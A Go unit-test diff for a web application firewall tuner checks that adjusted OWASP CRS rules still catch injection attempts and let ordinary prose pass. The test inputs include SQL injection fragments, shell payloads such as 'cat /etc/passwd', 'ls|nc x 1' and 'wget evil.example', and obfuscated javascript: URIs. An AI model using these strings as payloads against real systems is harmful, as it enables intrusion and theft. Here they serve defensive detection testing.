@@ -387,3 +387,81 @@ func TestSQLSignalBeforeComment(t *testing.T) {
 		}
 	}
 }
+
+// 15/10/2026 (docs/decisions/base64-args.md): GoTestWAF's false-positive set
+// is prose that four CRS PL1 rules block on their own. The tuning lets the
+// prose through and keeps the injections those rules are for.
+func TestTuneProseFalsePositives(t *testing.T) {
+	sql := regexp.MustCompile(sqlSignal)
+	for _, v := range []string{"1 or 1", "x or true", "1 union select 1", "admin' or 'a", "2 and sleep 5"} {
+		if !sql.MatchString(v) {
+			t.Errorf("sqlSignal misses %q", v)
+		}
+	}
+	for _, v := range []string{"john or@var.es", "john+or@var.es", "rock and roll"} {
+		if sql.MatchString(v) {
+			t.Errorf("sqlSignal matches prose %q", v)
+		}
+	}
+
+	shell := regexp.MustCompile(shellSignal)
+	for _, v := range []string{"ls -la", "cat /etc/passwd", "id", " whoami ", "ls|nc x 1", "zsh -c x", "wget x>y", "sh $(id)", "wget evil.example"} {
+		if !shell.MatchString(v) {
+			t.Errorf("shellSignal misses %q", v)
+		}
+	}
+	for _, v := range []string{"ls 300 lexus", "zsh is the best!", "who am i"} {
+		if shell.MatchString(v) {
+			t.Errorf("shellSignal matches prose %q", v)
+		}
+	}
+
+	// 942190, on the part tune rewrites
+	union := regexp.MustCompile(`(?i)` + unionTight)
+	for _, v := range []string{"union select 1", "UNION ALL SELECT", "union  distinct (select", "union(select", "union0select", "union(all(select", "union\ndistinctrow\x0bselect", "unionx\nselect"} {
+		if !union.MatchString(v) {
+			t.Errorf("942190 misses %q", v)
+		}
+	}
+	for _, v := range []string{"union was a great select", "the union will select a leader"} {
+		if union.MatchString(v) {
+			t.Errorf("942190 matches prose %q", v)
+		}
+	}
+
+	cond := func(op string, v any) map[string]any {
+		return map[string]any{"operator": map[string]any{"type": op, "value": v}, "targets": []any{map[string]any{"var": "args"}}, "transforms": []any{"html_entity_decode"}}
+	}
+	for _, id := range []int{932250, 941210} {
+		r := map[string]any{"match": map[string]any{"all": []any{cond("rx", "x")}}}
+		var notes []string
+		tune(id, r, &notes)
+		all := r["match"].(map[string]any)["all"].([]any)
+		if len(all) != 2 || len(notes) != 1 {
+			t.Fatalf("%d: %v", id, all)
+		}
+		c := all[1].(map[string]any)
+		if c["targets"].([]any)[0].(map[string]any)["var"] != "matched_vars" {
+			t.Errorf("%d condition: %v", id, c)
+		}
+		if _, ok := c["transforms"]; ok != (id == 941210) {
+			t.Errorf("%d transforms: %v", id, c)
+		}
+	}
+	js := regexp.MustCompile(jsSignal)
+	for _, v := range []string{"javascript: alert(1)", "javascript:x=1", "ja\tvascript: ", "ja&tab;vascript: ", "ja&newline;vascript:"} {
+		if !js.MatchString(v) {
+			t.Errorf("jsSignal misses %q", v)
+		}
+	}
+	if js.MatchString("JavaScript: Basics of JavaScript Language") {
+		t.Error("jsSignal matches prose")
+	}
+	r := map[string]any{"match": map[string]any{"all": []any{cond("rx", "(?i)x|"+unionAnyWords+"|y")}}}
+	var notes []string
+	tune(942190, r, &notes)
+	got := r["match"].(map[string]any)["all"].([]any)[0].(map[string]any)["operator"].(map[string]any)["value"]
+	if got != "(?i)x|"+unionTight+"|y" || len(notes) != 1 {
+		t.Errorf("942190: %v %v", got, notes)
+	}
+}
